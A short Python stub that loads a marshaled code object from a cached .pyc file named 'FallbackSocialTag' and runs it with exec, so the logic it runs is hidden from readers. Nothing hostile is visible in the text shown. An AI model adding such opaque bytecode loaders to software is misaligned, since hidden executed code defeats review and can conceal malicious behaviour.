
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'FallbackSocialTag_c805ecf0854f462882a9dccaecb70891.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
